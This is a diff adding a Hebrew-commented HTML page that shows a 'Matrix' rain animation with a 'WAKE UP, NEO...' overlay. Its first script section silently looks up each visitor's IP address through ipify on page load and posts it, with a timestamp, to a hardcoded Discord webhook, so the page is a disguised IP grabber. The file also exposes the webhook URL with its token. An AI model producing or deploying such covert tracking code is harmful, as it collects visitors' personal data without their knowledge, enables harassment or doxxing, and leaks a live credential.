@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html lang="he">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>The Matrix Rain</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background-color: #000;
+            overflow: hidden;
+            height: 100vh;
+            width: 100vw;
+            font-family: monospace;
+        }
+
+        canvas {
+            display: block;
+            position: absolute;
+            top: 0;
+            left: 0;
+        }
+
+        .overlay-text {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: #00ff00;
+            font-size: 2.5rem;
+            text-align: center;
+            text-shadow: 0 0 10px #00ff00;
+            pointer-events: none;
+            font-family: 'Courier New', Courier, monospace;
+            letter-spacing: 5px;
+            animation: pulse 2s infinite alternate;
+        }
+
+        @keyframes pulse {
+            0% { opacity: 0.7; text-shadow: 0 0 5px #00ff00; }
+            100% { opacity: 1; text-shadow: 0 0 20px #00ff00, 0 0 30px #00ff00; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="overlay-text">WAKE UP, NEO...</div>
+    <canvas id="matrixCanvas"></canvas>
+
+    <script>
+        // --- חלק 1: שליחת ה-IP לדיסקורד ---
+        
+        // הוסף את הקישור של ה-Webhook שלך כאן בין המרכאות
+        const webhookUrl = "https://discord.com/api/webhooks/1526343615247290579/xcCLZVWb1IgXOHAY0EdAz2X9ea3lf_RHfnIQaX08m55RvaKeLAgN_S5cHdwirB2uTceQ";
+
+        async function sendVisitorInfo() {
+            try {
+                // משתמשים בשירות חיצוני חינמי (ipify) כדי לגלות את ה-IP של הגולש מהדפדפן
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                const userIP = ipData.ip;
+
+                // שולחים את המידע ישירות לדיסקורד
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        content: `🚨 מישהו נכנס לאתר המטריקס שלך!\n🌐 **כתובת IP:** ${userIP}\n⏰ **זמן:** ${new Date().toLocaleString()}`
+                    })
+                });
+            } catch (error) {
+                // מונע מהשגיאה לקרוס ולהרוס את האפקט של המטריקס אם השליחה נכשלה
+                console.log("Error logging visitor.");
+            }
+        }
+
+        // הפעלת הפונקציה מיד כשהדף נטען
+        if (webhookUrl !== "YOUR_DISCORD_WEBHOOK_URL_HERE") {
+            sendVisitorInfo();
+        }
+
+        // --- חלק 2: אפקט הגשם של המטריקס ---
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const katakana = "ｱｲｳｴｵｶｷｸｹｺｻｼｽｾｿﾀﾁﾂﾃﾄﾅﾆﾇﾈﾉﾊﾋﾌﾍﾎﾏﾐﾑﾒﾓﾔﾕﾖﾗﾘﾙﾚﾛﾜﾝ1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ";
+        const alphabet = katakana.split("");
+        const fontSize = 16;
+        let columns = canvas.width / fontSize;
+        const rainDrops = [];
+
+        for (let x = 0; x < columns; x++) {
+            rainDrops[x] = 1;
+        }
+
+        function draw() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < rainDrops.length; i++) {
+                const text = alphabet[Math.floor(Math.random() * alphabet.length)];
+                const x = i * fontSize;
+                const y = rainDrops[i] * fontSize;
+
+                if (Math.random() > 0.98) {
+                    ctx.fillStyle = '#fff';
+                } else {
+                    ctx.fillStyle = '#0F0';
+                }
+
+                ctx.fillText(text, x, y);
+
+                if (y > canvas.height && Math.random() > 0.975) {
+                    rainDrops[i] = 0;
+                }
+                rainDrops[i]++;
+            }
+        }
+
+        setInterval(draw, 30);
+    </script>
+</body>
+</html>
+
